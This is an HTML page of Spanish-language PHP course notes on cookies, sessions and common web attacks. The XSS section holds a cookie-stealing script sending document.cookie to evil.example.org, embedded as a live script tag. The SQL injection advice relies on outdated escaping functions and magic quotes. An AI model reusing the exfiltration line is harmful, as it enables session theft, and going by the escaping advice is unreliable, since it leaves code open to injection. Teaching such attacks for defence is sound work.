<!DOCTYPE html> <html lang="en-US"> <head> <meta charset="UTF-8"> <meta http-equiv="X-UA-Compatible" content="IE=Edge"> <title>3 Cookies, sesiones y seguridad - DAW DOCS</title> <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"> <link rel="stylesheet" href="/assets/css/just-the-docs-default.css"> <script type="text/javascript" src="/assets/js/vendor/lunr.min.js"></script> <script type="text/javascript" src="/assets/js/just-the-docs.js"></script> <meta name="viewport" content="width=device-width, initial-scale=1"> <!-- Begin Jekyll SEO tag v2.7.1 --> <title>3 Cookies, sesiones y seguridad | DAW DOCS</title> <meta name="generator" content="Jekyll v4.2.0" /> <meta property="og:title" content="3 Cookies, sesiones y seguridad" /> <meta property="og:locale" content="en_US" /> <meta name="description" content="Apuntes del módulo de “Desarrollo web en entorno servidor”, de 2º curso del Ciclo Formativo de Grado Superior de “Desarrollo de Aplicaciones Web”, impartido en el IES Celia Viñas de Almería (España)" /> <meta property="og:description" content="Apuntes del módulo de “Desarrollo web en entorno servidor”, de 2º curso del Ciclo Formativo de Grado Superior de “Desarrollo de Aplicaciones Web”, impartido en el IES Celia Viñas de Almería (España)" /> <link rel="canonical" href="/cookies-sesiones-seguridad/" /> <meta property="og:url" content="/cookies-sesiones-seguridad/" /> <meta property="og:site_name" content="DAW DOCS" /> <meta name="twitter:card" content="summary" /> <meta property="twitter:title" content="3 Cookies, sesiones y seguridad" /> <script type="application/ld+json"> {"@type":"WebPage","url":"/cookies-sesiones-seguridad/","headline":"3 Cookies, sesiones y seguridad","description":"Apuntes del módulo de “Desarrollo web en entorno servidor”, de 2º curso del Ciclo Formativo de Grado Superior de “Desarrollo de Aplicaciones Web”, impartido en el IES Celia Viñas de Almería (España)","@context":"https://schema.org"}</script> <!-- End Jekyll SEO tag --> </head> <body> <svg xmlns="http://www.w3.org/2000/svg" style="display: none;"> <symbol id="svg-link" viewBox="0 0 24 24"> <title>Link</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-link"> <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path> </svg> </symbol> <symbol id="svg-search" viewBox="0 0 24 24"> <title>Search</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-search"> <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line> </svg> </symbol> <symbol id="svg-menu" viewBox="0 0 24 24"> <title>Menu</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-menu"> <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line> </svg> </symbol> <symbol id="svg-arrow-right" viewBox="0 0 24 24"> <title>Expand</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-right"> <polyline points="9 18 15 12 9 6"></polyline> </svg> </symbol> <symbol id="svg-doc" viewBox="0 0 24 24"> <title>Document</title> <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file"> <path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"></path><polyline points="13 2 13 9 20 9"></polyline> </svg> </symbol> </svg> <div class="side-bar"> <div class="site-header"> <a href="/" class="site-title lh-tight"> DAW DOCS </a> <a href="#" id="menu-button" class="site-button"> <svg viewBox="0 0 24 24" class="icon"><use xlink:href="#svg-menu"></use></svg> </a> </div> <nav role="navigation" aria-label="Main" id="site-nav" class="site-nav"> <ul class="nav-list"><li class="nav-list-item active"><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/" class="nav-list-link">Desarrollo Web en Entorno Servidor</a><ul class="nav-list "><li class="nav-list-item "><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/cms/" class="nav-list-link">1 Sistemas gestores de contenido (CMS)</a><ul class="nav-list"><li class="nav-list-item "> <a href="/cms/algunas-cosas-que-debes-saber" class="nav-list-link">1.1 Algunas cosas que debes saber sobre los CMS</a> </li><li class="nav-list-item "> <a href="/cms/wordpress" class="nav-list-link">1.2 Wordpress</a> </li><li class="nav-list-item "> <a href="/cms/moodle" class="nav-list-link">1.3 Moodle</a> </li><li class="nav-list-item "> <a href="/cms/prestashop" class="nav-list-link">1.4 Prestashop</a> </li></ul></li><li class="nav-list-item "><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/php/" class="nav-list-link">2 Introducción a PHP</a><ul class="nav-list"><li class="nav-list-item "> <a href="/php/programacion-cliente-servidor" class="nav-list-link">2.1 Programación cliente-servidor</a> </li><li class="nav-list-item "> <a href="/php/caja-de-herramientas" class="nav-list-link">2.2 Caja de herramientas</a> </li><li class="nav-list-item "> <a href="/php/sintaxis-de-php" class="nav-list-link">2.3 Sintaxis de PHP</a> </li><li class="nav-list-item "> <a href="/php/interaccion-con-php" class="nav-list-link">2.4 Interacción con la base de datos</a> </li><li class="nav-list-item "> <a href="/php/ejercicios-resueltos" class="nav-list-link">2.5 Ejercicios resueltos</a> </li></ul></li><li class="nav-list-item active"><a href="/cookies-sesiones-seguridad/" class="nav-list-link active">3 Cookies, sesiones y seguridad</a></li><li class="nav-list-item "><a href="/mvc/" class="nav-list-link">4 Arquitectura MVC</a></li><li class="nav-list-item "><a href="#" class="nav-list-expander"><svg viewBox="0 0 24 24"><use xlink:href="#svg-arrow-right"></use></svg></a><a href="/laravel/" class="nav-list-link">5 Laravel</a><ul class="nav-list"><li class="nav-list-item "> <a href="/laravel/1" class="nav-list-link">5.1 Frameworks PHP MVC</a> </li><li class="nav-list-item "> <a href="/laravel/2" class="nav-list-link">5.2 Características de Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/3" class="nav-list-link">5.3 Instalación de Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/4" class="nav-list-link">5.4 Arquitectura, convenciones y configuración de Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/5" class="nav-list-link">5.5 Artisan</a> </li><li class="nav-list-item "> <a href="/laravel/6" class="nav-list-link">5.6 Primeros pasos con Laravel. Hola mundo</a> </li><li class="nav-list-item "> <a href="/laravel/7" class="nav-list-link">5.7 Enrutamiento</a> </li><li class="nav-list-item "> <a href="/laravel/8" class="nav-list-link">5.8 Vistas y plantillas. Blade</a> </li><li class="nav-list-item "> <a href="/laravel/9" class="nav-list-link">5.9 Controladores</a> </li><li class="nav-list-item "> <a href="/laravel/10" class="nav-list-link">5.10 Migraciones</a> </li><li class="nav-list-item "> <a href="/laravel/11" class="nav-list-link">5.11 Usando la BD con Eloquent</a> </li><li class="nav-list-item "> <a href="/laravel/12" class="nav-list-link">5.12 Usando la BD con QueryBuilder</a> </li><li class="nav-list-item "> <a href="/laravel/13" class="nav-list-link">5.13 Sesiones con Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/14" class="nav-list-link">5.14 Helpers de Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/15" class="nav-list-link">5.15 Flujo de trabajo típico con Laravel</a> </li><li class="nav-list-item "> <a href="/laravel/16" class="nav-list-link">5.16 Laravel y Vue.js</a> </li><li class="nav-list-item "> <a href="/laravel/17" class="nav-list-link">5.17 Aspectos avanzados de Laravel</a> </li></ul></li><li class="nav-list-item "><a href="/servicios-web/" class="nav-list-link">6 Servicios web</a></li><li class="nav-list-item "><a href="/ajax/" class="nav-list-link">7 Ajax</a></li><li class="nav-list-item "><a href="/otras-tecnologias/" class="nav-list-link">8 Otras tecnologías</a></li><li class="nav-list-item "><a href="/scv-git/" class="nav-list-link">Anexo I. Sistemas de control de versiones. Git</a></li></ul></li><li class="nav-list-item"><a href="/about/" class="nav-list-link">About</a></li></ul> </nav> <footer class="site-footer"> This site uses <a href="https://github.com/pmarsceill/just-the-docs">Just the Docs</a>, a documentation theme for Jekyll. </footer> </div> <div class="main" id="top"> <div id="main-header" class="main-header"> <div class="search"> <div class="search-input-wrap"> <input type="text" id="search-input" class="search-input" tabindex="0" placeholder="Search DAW DOCS" aria-label="Search DAW DOCS" autocomplete="off"> <label for="search-input" class="search-label"><svg viewBox="0 0 24 24" class="search-icon"><use xlink:href="#svg-search"></use></svg></label> </div> <div id="search-results" class="search-results"></div> </div> </div> <div id="main-content-wrap" class="main-content-wrap"> <nav aria-label="Breadcrumb" class="breadcrumb-nav"> <ol class="breadcrumb-nav-list"> <li class="breadcrumb-nav-list-item"><a href="/">Desarrollo Web en Entorno Servidor</a></li> <li class="breadcrumb-nav-list-item"><span>3 Cookies, sesiones y seguridad</span></li> </ol> </nav> <div id="main-content" class="main-content" role="main"> <h1 id="3-cookies-sesiones-y-seguridad"> <a href="#3-cookies-sesiones-y-seguridad" class="anchor-heading" aria-labelledby="3-cookies-sesiones-y-seguridad"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3. Cookies, sesiones y seguridad </h1> <h2 id="31-autenticación-mediante-acl"> <a href="#31-autenticación-mediante-acl" class="anchor-heading" aria-labelledby="31-autenticación-mediante-acl"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.1. Autenticación mediante ACL </h2> <p>Casi todas las aplicaciones web incluyen un subsistema de autenticación de usuarios (ACL = Access Control List).</p> <p>Ese subsistema suele estar basado en este diseño de base de datos:</p> <p><img src="/assets/images/03-acl.jpg" alt="Tablas ACL" /></p> <p>Esto significa que necesitamos <strong>cinco tablas</strong> para implementar un ACL completo.</p> <p>Sin embargo, la mayor parte de las veces tendremos suficiente con solo tres tablas (usuarios, roles y usuarios-roles), o incluso solo con una (usuarios, añadiendo quizá un campo “tipo”). Optar por una solución más o menos compleja dependerá del tipos de sistema que estemos implementando.</p> <p>En cualquier caso, es conveniente que conozcas el esquema ACL completo (5 tablas) para que lo pongas en práctica cuando lo necesites.</p> <h2 id="32-cookies"> <a href="#32-cookies" class="anchor-heading" aria-labelledby="32-cookies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.2. Cookies </h2> <h3 id="321-qué-son-las-cookies"> <a href="#321-qué-son-las-cookies" class="anchor-heading" aria-labelledby="321-qué-son-las-cookies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.2.1. ¿Qué son las cookies? </h3> <p>Las cookies son pequeños archivos de texto enviados desde el servidor que se almacenan en el lado del cliente. Permiten guardar información de forma persistente, de manera que se mantenga entre una petición al servidor y otra. Una cookie puede durar minutos, horas, días o incluso indefinidamente.</p> <p>PHP soporta cookies de forma transparente. Se pueden configurar Cookies usando las funciones setcookie() o setrawcookie() y el array global $_COOKIE.</p> <h3 id="322-menajando-cookies-con-php"> <a href="#322-menajando-cookies-con-php" class="anchor-heading" aria-labelledby="322-menajando-cookies-con-php"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.2.2. Menajando cookies con PHP </h3> <h4 id="enviar-una-cookie-setcookie"> <a href="#enviar-una-cookie-setcookie" class="anchor-heading" aria-labelledby="enviar-una-cookie-setcookie"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Enviar una cookie: setcookie() </h4> <p>Esta función define una cookie que se enviará al cliente junto con el resto de las cabeceras de HTTP. Devuelve <em>true</em> si la cookie se envía con éxito o <em>false</em> en caso contrario.</p> <p>Su sintaxis es:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bool</span> <span class="nb">setcookie</span> <span class="p">(</span> <span class="n">string</span> <span class="nv">$name</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$value</span> <span class="p">[,</span> <span class="n">int</span> <span class="nv">$expire</span> <span class="o">=</span> <span class="mi">0</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$path</span> <span class="p">[,</span> <span class="n">string</span> <span class="nv">$domain</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">[,</span> <span class="n">bool</span> <span class="nv">$httponly</span> <span class="o">=</span> <span class="kc">false</span> <span class="p">]]]]]]</span> <span class="p">)</span>
</code></pre></div></div> <p>Las cookies deben enviarse antes de que el script genere ninguna salida. Esto es una restricción del protocolo http. Por lo tanto, debes llamar a esta función antes de hacer <em>cualquier</em> salida, incluidos espacios en blanco. En caso contrario, la cookie no estará disponible hasta que la página se recargue.</p> <p>La función setcookie() admite un montón de parámetros, la mayor parte de ellos optativos:</p> <ul> <li><strong>name</strong>: El nombre de la cookie. Este es el único obligatorio.</li> <li><strong>value</strong>: El valor de la cookie.</li> <li><strong>expire</strong>: El tiempo que la cookie tardará en expirar. Se trata de una fecha expresada en formato Unix.</li> <li><strong>path</strong>: La ruta del servidor para la que la cookie estará disponible. Si se utiliza ‘/’, la cookie estará disponible en la totalidad del dominio.</li> <li><strong>domain</strong>: El dominio para el cual la cookie está disponible.</li> <li><strong>secure</strong>: Si la cookie solo debería enviarse en caso de conexión https, pon este argument a <em>true</em>.</li> <li><strong>httponly</strong>: Esta cookie solo será accesible a través de http. Es decir, no podrá utilizarse desde Javascript.</li> </ul> <p>Aquí tienes tres ejemplos de envío de la misma cookie:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nv">$value</span> <span class="o">=</span> <span class="s1">'I'</span><span class="n">m</span> <span class="n">your</span> <span class="n">father</span><span class="err">'</span><span class="p">;</span> 

<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">);</span> 
<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">);</span>  <span class="c1">// la cookie expira en una hora </span>
<span class="nb">setcookie</span><span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="nv">$value</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span><span class="o">+</span><span class="mi">3600</span><span class="p">,</span> <span class="s2">"/quotes/"</span><span class="p">,</span> <span class="s2">"bestquotes.com"</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span> 
<span class="cp">?&gt;</span>
</code></pre></div></div> <h4 id="recuperar-una-cookie-_cookies"> <a href="#recuperar-una-cookie-_cookies" class="anchor-heading" aria-labelledby="recuperar-una-cookie-_cookies"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Recuperar una cookie: $_COOKIES[] </h4> <p>Para ver el contenido de una cookie, simplemente hay que acceder al array global $_COOKIES. Por ejemplo:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="c1">// Imprimir una cookie individual </span>
<span class="k">echo</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s2">"VaderQuote"</span><span class="p">];</span> 

<span class="cp">?&gt;</span> 
</code></pre></div></div> <h4 id="borrar-una-cookie"> <a href="#borrar-una-cookie" class="anchor-heading" aria-labelledby="borrar-una-cookie"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> Borrar una cookie </h4> <p>Para forzar el borrado de una cookie en el cliente basta con enviarla con una fecha de expiración anterior a la fecha actual. Por ejemplo:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
<span class="nb">setcookie</span> <span class="p">(</span><span class="s2">"VaderQuote"</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">3600</span><span class="p">);</span>  <span class="c1">// Establece la fecha de expiración una hora en el pasado</span>
<span class="cp">?&gt;</span>
</code></pre></div></div> <h2 id="33-sesiones"> <a href="#33-sesiones" class="anchor-heading" aria-labelledby="33-sesiones"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.3. Sesiones </h2> <p>Las sesiones en PHP habilitan un mecanismo para que un script almacene variables (llamadas <strong>variables de sesión</strong>) en el servidor de manera persistente, de modo que posteriores peticiones de scripts procedentes de un cliente puedan acceder a esas variables.</p> <p>Cada cliente tiene su propio espacio de variables de sesión en el servidor, de manera que no se mezclan unas con otras, ni un cliente puede acceder a las variables de otro cliente.</p> <p>La forma en la que PHP logra distinguir a los clientes entre sí es enviándoles una cookie con un valor aleatorio diferente para cada cliente.</p> <p>En el archivo php.ini se puede configurar la manera en la que PHP almacenará las variables de sesión (en memoria, en un fichero, etc), pero esto es irrelevante de cara a su funcionamiento y compete más al administrador del sistema que al programador. Lo que a nosotros nos interesa es aprender a crear variables de sesión, asignarles valor y recuperarlo posteriormente.</p> <h3 id="331-abrir-sesiones-session_start"> <a href="#331-abrir-sesiones-session_start" class="anchor-heading" aria-labelledby="331-abrir-sesiones-session_start"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.3.1. Abrir sesiones: session_start() </h3> <p>Antes de acceder a cualquier variable de sesión (ya sea para crearla, para modificarla o para eliminarla) necesitamos indicarle a PHP que queremos usar variables de sesión en ese scrpit.</p> <p>La función <strong>session_start()</strong> se usa para eso: habilita el acceso a las variables de sesión, es decir, crea una nueva sesión o reanuda una sesión preexistente.</p> <p>Las sesiones admiten un nombre, por si necesitas crear sesiones separadas para el mismo cliente. No obstante, la mayor parte de las veces te bastará con crear sesiones sin nombre, sin necesidad de pasar ningún argumento a session_start().</p> <h3 id="332-usar-variables-de-sesión-_session"> <a href="#332-usar-variables-de-sesión-_session" class="anchor-heading" aria-labelledby="332-usar-variables-de-sesión-_session"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.3.2. Usar variables de sesión: $_SESSION </h3> <p>Las variables de sesión se manipulan a través del array superglobal <strong>$_SESSION</strong>.</p> <p>Si necesitas una variable de sesión llamada, por ejemplo, nombre_usuario, simplemente haz esto:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]</span> <span class="o">=</span> <span class="s2">"lo-que-sea"</span><span class="p">;</span>
</code></pre></div></div> <p>Por supuesto, el valor de esa posición del array $_SESSION puede consultarse o modificarse cuando lo necesitemos.</p> <h3 id="333-eliminar-variables-de-sesión-unset-y-session_destroy"> <a href="#333-eliminar-variables-de-sesión-unset-y-session_destroy" class="anchor-heading" aria-labelledby="333-eliminar-variables-de-sesión-unset-y-session_destroy"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.3.3. Eliminar variables de sesión: unset() y session_destroy() </h3> <p>La función <strong>unset()</strong> se utiliza para destruir cualquier variable, incluidas las de sesión:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'nombre_usuario'</span><span class="p">]);</span>
</code></pre></div></div> <p>Si lo que deseas es destruir todas las variables de sesión, es preferible recurrir a <strong>session_destroy()</strong>.</p> <p>Ahora bien, session_destroy() destruye la información asociada a la sesión actual, pero no elimina realmente las variables de la memoria del servidor ni borra la cookie de sesión del cliente.</p> <p>Para asegurarte de destruir todas las variables de sesión, puedes usar la función <strong>session_unset()</strong>.</p> <p>Y, para borrar la cookie de sesión, debes usar <strong>setcookie()</strong>, como en este ejemplo:</p> <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="cp">&lt;?php</span>
<span class="c1">// Retomar la sesión.</span>
<span class="nb">session_start</span><span class="p">();</span>

<span class="c1">// Destruir todas las variables de sesión (optativo)</span>
<span class="nb">session_unset</span><span class="p">();</span>

<span class="c1">// Si se desea destruir la sesión completamente, borre también la cookie de sesión.</span>
<span class="c1">// Nota: ¡Esto destruirá la sesión, y no la información de la sesión!</span>
<span class="nv">$params</span> <span class="o">=</span> <span class="nb">session_get_cookie_params</span><span class="p">();</span>
<span class="nb">setcookie</span><span class="p">(</span><span class="nb">session_name</span><span class="p">(),</span> <span class="s1">''</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">-</span> <span class="mi">42000</span><span class="p">,</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s2">"path"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"domain"</span><span class="p">],</span>
        <span class="nv">$params</span><span class="p">[</span><span class="s2">"secure"</span><span class="p">],</span> <span class="nv">$params</span><span class="p">[</span><span class="s2">"httponly"</span><span class="p">]</span>
<span class="p">);</span>

<span class="c1">// Finalmente, cerrar la sesión</span>
<span class="nb">session_destroy</span><span class="p">();</span>
<span class="cp">?&gt;</span>
</code></pre></div></div> <h2 id="34-sesiones-cookies-y-seguridad"> <a href="#34-sesiones-cookies-y-seguridad" class="anchor-heading" aria-labelledby="34-sesiones-cookies-y-seguridad"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.4. Sesiones, cookies y seguridad </h2> <p>Cookies y variables de sesión se usan a menudo para controlar la seguridad de la aplicación web.</p> <p>Por ejemplo, tras el login, el ID del usuario puede almacenarse en:</p> <ul> <li><strong>Una cookie</strong>. Si existe esa cookie, significa que el login ha sido correcto y la aplicación puede continuar.</li> <li><strong>Una variable de sesión</strong>. Si existe determinada variable (por ejemplo, una con el id del usuario), el login ha sido correcto.</li> </ul> <p>Cuando el usuario abandona la aplicación, el programa debe destruir la cookie o cerrar la sesión.</p> <p>Pues bien: <strong>ninguno de estos métodos es completamente seguro</strong>.</p> <p>Las cookies pueden rastrearse o modificarse en el ordenador del cliente. Además, algunos clientes las tienen desactivadas. ¡No te puedes fiar de ellas!</p> <p>Las variables de sesión, en principio más seguras, pueden ser atacadas capturando el ID de sesión, como veremos más adelante.</p> <p>El método más seguro, y el más complicado de programar, es el que combina:</p> <ul> <li>Cookies y/o variables de sesión.</li> <li>Variables guardadas en una tabla de la BD.</li> </ul> <p>El uso de frameworks solventes (como los que veremos este curso) hace innecesario tomarse este trabajo, puesto que todos habilitan un mecanismo de sesiones seguras que mejora notablemente las prestaciones de las sesiones nativas de PHP.</p> <h2 id="35-técnicas-de-ataque-frecuentes"> <a href="#35-técnicas-de-ataque-frecuentes" class="anchor-heading" aria-labelledby="35-técnicas-de-ataque-frecuentes"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5. Técnicas de ataque frecuentes </h2> <p>(Esta sección está adaptada de <a href="securitybydefault.com">securitybydefault.com</a>)</p> <p>Uno de los fallos más graves y más frecuentes a la hora de escribir aplicaciones PHP es olvidarse de la seguridad.</p> <p>Cualquier aplicación web, por el mero hecho de estar abierta a recibir información procedente de la red, es susceptible de ser atacada. Y te aseguro que, antes o después, cualquier aplicación que está online acaba por ser atacada. Es una certeza matemática.</p> <p>En esta sección vamos a describir qué tipos de ataque son los más frecuentes.</p> <p>Aunque proporcionaremos algunas estrategias de defensa (que debes tener en cuenta en tus desarrollos), hay una estrategia común a todos estos ataques: utilizar un framework potente como Laravel, Symfony o Zend, debidamente actualizado. Los mecanismos de seguridad que implementan estos frameworks son suficientes para la mayor parte de los casos y se mejoran cada vez que se descubre una vulnerabilidad.</p> <h3 id="351-captura-de-id-de-sesión"> <a href="#351-captura-de-id-de-sesión" class="anchor-heading" aria-labelledby="351-captura-de-id-de-sesión"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.1. Captura de ID de sesión </h3> <p>El ID de sesión se guarda como una cookie en el cliente. Por lo tanto, viaja en el paquete http desde el servidor hasta el cliente.</p> <p>Un atacante que esté escuchando en esa red puede leer el ID de sesión del paquete http y, de ese modo, suplantar la identidad de la persona que inició la sesión. También puede inyectar Javascript a su víctima para capturar de ese modo el ID de sesión, con idénticos resultados.</p> <p>Soluciones:</p> <ul> <li>Combinar las variables de sesión con cookies o con entradas en la base de datos.</li> <li>Cambiar el ID de sesión periódicamente.</li> <li>No confiar en variables de sesión de PHP para almacenar información muy sensible.</li> <li>Denegar el acceso a la cookie de sesión desde Javascript (usando el atributo httponly).</li> <li>Acceder solo a webs que usen https, no http. De ese modo, la cookie de sesión viaja encriptada hasta el navegador.</li> </ul> <h3 id="352-inyección-de-sql"> <a href="#352-inyección-de-sql" class="anchor-heading" aria-labelledby="352-inyección-de-sql"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.2. Inyección de SQL </h3> <p>XXX</p> <p>Este ataque se produce cuando un atacante ejecuta sentencias SQL en la base de datos del sitio web, insertando en un campo del formulario sentencias SQL dentro de otra sentencia SQL haciendo que se ejecute la sentencia invasora.</p> <p>Se recomienda:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• Filtrar los datos. Por ejemplo, si tenemos en nuestro formulario el campo username, y sabemos que los usuarios sólo pueden estar compuestos por letras y números, no se deben permitir caracteres como " ' " o " = " . O si se trata del campo e-mail, podemos utilizar expresiones regulares para validarlo, como preg_match('/^.+@.+\..{2,3}$/',$_POST['email'])
• Usar funciones que escapan caracteres especiales de una cadena para su uso en una sentencia SQL, como mysql_real_escape_string(), la cual coloca barras invertidas antes de los siguientes caracteres: \x00, \n, \r, \, ', " y \x1a. O addslashes(). La directiva de PHP magic_quotes_gpc está activada por defecto, y básicamente ejecuta la función addslashes() en todos los datos GET, POST, y COOKIE. No se debe utilizar addslashes() en las cadenas que ya se han escapado con magic_quotes_gpc ya que se hará un doble escape.
</code></pre></div></div> <h3 id="353-xss-cross-site-scripting"> <a href="#353-xss-cross-site-scripting" class="anchor-heading" aria-labelledby="353-xss-cross-site-scripting"><svg viewBox="0 0 16 16" aria-hidden="true"><use xlink:href="#svg-link"></use></svg></a> 3.5.3. XSS (cross site scripting) </h3> <p>Las vulnerabilidades de XSS permiten ejecutar código de scripting en el contexto del sitio web:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• Explotando la confianza que tiene un usuario de un sitio web. Puede que los usuarios no tengan un alto nivel de confianza en un sitio web, pero sí el navegador. Por ejemplo, cuando el navegador envía cookies en una petición.
• Haciendo que los sitios web muestren datos externos. Como aplicaciones de mayor riesgo que incluyen foros, clientes de correo web, o contenido de RSS.
• Cuando los datos externos no se filtran adecuadamente un atacante puede inyectar un contenido. Esto es tan peligroso como dejar que el atacante edite código en el servidor.
</code></pre></div></div> <p>Un usuario que ejecute este código con JavaScript activado en su navegador será redireccionado a evil.example.org, y las cookies asociadas al sitio web serán incluidas en la consulta:</p> <script>document.locationn = 'http://evil.example.org/steal_cookies.php?cookies=' + document.cookie</script> <p>Se recomienda:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>• Filtrar todos los datos externos. El filtrado de datos es la práctica más importante que se puede adoptar. Al validar todos los datos externos a medida que entran y salen de la aplicación se mitigarán la mayoría de las preocupaciones del XSS.
• Utilizar las funciones que tiene PHP que ayudan al filtrado. Pueden ser útiles htmlentities () que convierte caracteres a entidades HTML, strip_tags () que elimina las etiquetas HTML y PHP de una cadena y utf8_decode ().
• Basarse en listas blancas. Supongamos que los datos no son válidos hasta que no se pruebe que lo son. Esto implica verificar la longitud y asegurar que sólo los caracteres válidos son permitidos. Por ejemplo, si se inserta el nombre y apellidos, se debe asegurar que sólo se permiten letras y espacios. Por ejemplo Berners-Lee se consideraría nula, pero esto se puede arreglar añadiendo este nombre a la lista blanca. Es mejor rechazar datos válidos que aceptar datos maliciosos.
• Utilizar una convención de nomenclatura estricta. Una convención de nomenclatura puede ayudar a los desarrolladores a distinguir entre datos filtrados y sin filtrar.
